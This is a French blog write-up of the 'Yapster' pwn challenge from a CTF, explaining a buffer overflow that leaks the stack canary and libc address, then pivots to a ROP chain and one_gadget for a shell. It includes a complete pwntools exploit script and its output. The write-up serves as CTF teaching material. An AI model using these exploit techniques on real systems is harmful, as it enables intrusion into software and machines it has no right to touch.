---
layout: post
title: "Challenge Yapster, batmans.kitchen"
date: 2026-02-24 12:00:00 +0100
categories: CTF
---

[https://ctf.batmans.kitchen/challs](https://ctf.batmans.kitchen/challs)

Petit utilitaire de boite au lettre simpliste.
Il a toutes les protections modernes, sauf FORTIFY.
Il tourne avec une libc un peu ancienne; v2.31.
Une première fonction permet d'envoyer un message, une seconde de le lire.
Je passe le binaire yapster à pwninit/patchelf pour travailler dessus avec la bonne libc.

Les messages ont la structure suivante:
```c
struct Message __packed {
    char sender[0x20];
    char reciever[0x20];
    time_t_1 timeSent;
    size_t messageLen;
    char messageBody[0x30];
};
```

La première vulnérabilité est ici, dans la fonction sendMessage:
```c
+0x0e0        fgets(buf: &msg.reciever, n: 0x30, fp: stdin)
```
On copie 0x30 octets dans un champ de 0x20. On écrase `timeSent` et `messageLen`.
Ensuite le programme regarde à qui est envoyé le messaage :
```c
+0x123        if (strcmp(&msg.reciever, "BigHippo85") != 0)
+0x1ac            memcpy(&sentMessage.msg.messageBody, &msg, 0x80)
+0x123        else if (n_messages <= 0x1f)
+0x16a            memcpy((sx.q(n_messages) << 7) + &inbox, &msg, 0x80)
```
Si le message est envoyé à quelqu'un d'autre que BigHippo85, il est copié dans une structure sur la pile, et écrase le canary. Le programme s'arrete après une telle violence.
Si c'est envoyé à BigHippo85, il est copié dans `&inbox`, qui est dans `.bss`, tout va bien.

On peut donc écraser la pile mais il faut remettre le canary. Il faut donc leaker ce canary. On ne juge pas.
Heureusement la fonction readInbox affiche le message en faisant confiance à `messageLen`.
```c
+0x14e                fwrite(buf: &msg.messageBody, size: 1, count: msg.messageLen, fp: stdout)
```

Le plan d'attaque est le suivant :
- utiliser l'overflow sur `reciever` pour écraser `messageLen`.
- afficher le message pour leaker la pile qui contient le canary et des leaks de la libc.
- écraser la pile dans sendMessage en remettant le canary à sa place.

Pour l'étape 1 il faut faire un overflow de `reciever` tout en passant la comparaison à "BigHippo85".
L'astuce est que `fgets` accepte les NULL, et que `strcmp` s'arrête au premier NULL.
On overflow donc avec `BigHippo85\0...` pour que `reciever=="BigHippo85"` et que le message soit copié dans la `.bss`.
Ca évite d'écraser la pile et son canary.

Une fois avec le leak on met ce que l'on veut dans `reciever` pour écraser la pile jusqu'à l'adresse retour.
(avec le canary au bon endroit)
Par contre il ne reste plus qu'un qword pour écraser l'adresse retour. Pas de ROP direct.
Le contexte ne permet pas de sauter vers un `one_gadget`.
A la suite de `messageLen` écrasé il y a le contenu du message, il suffit de retourner vers un ret, et ensuite rsp pointe sur le message. On y place sa ROP ; on nettoie un registre et on saute sur le `one_gadget`.

```bash
➜  yapster ./exploit.py       
[+] Starting local process '/opt/ctf/batmans/yapster/yapster_patched': pid 35788
[+] canary = 0xad9a3c20e191ad00
[+] libc base = 0x79efc70e7000
[*] Loaded 195 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
Linux axismundi 6.8.0-100-generic #100-Ubuntu SMP PREEMPT_DYNAMIC Tue Jan 13 16:40:06 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
FLAG
```

 \- mandragore, 2026/02/24

```python
#!/usr/bin/env python3

from pwn import *
import re
import sys
import os
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./yapster_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote('yapster-8437454c103936da.instancer.batmans.kitchen', 1337, ssl=True)
else:
    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            break *sendMessage+0x1ac
            continue
        ''')
    else:
        p = process(elf.path)

def write(payload=cyclic(0x2e),destinataire=b'BigHippo85',shmode=False):
    p.sendline(b'1')
    p.sendlineafter(b'> ',payload);
    p.sendlineafter(b'> ',destinataire)
    if not shmode:
        p.recvuntil(b'> ')

def read():
    p.sendline(b'2')
    return p.recvuntil(b'> ')

p.recvuntil(b'> ')

write(destinataire=b'BigHippo85\0'+cyclic(30)+b'\0xff') # overflow messageLen
leak=read()
#print(hexdump(leak))
canary=u64(leak[0x50:0x58])
log.success(f'canary = {canary:#x}')
libc.address = u64(leak[0x90:0x98])-libc.sym.__libc_start_main-243
log.success(f'libc base = {libc.address:#x}')

rop=ROP(libc)
rop.r12=0
rop.raw(libc.address+0xe3afe)
payload={
    0x18:p64(canary),
    0x28:p64(rop.ret.address)
}

write(payload=rop.chain(),destinataire=fit(payload),shmode=True)

p.sendline(b'uname -a;cat flag.txt')
p.interactive()
```
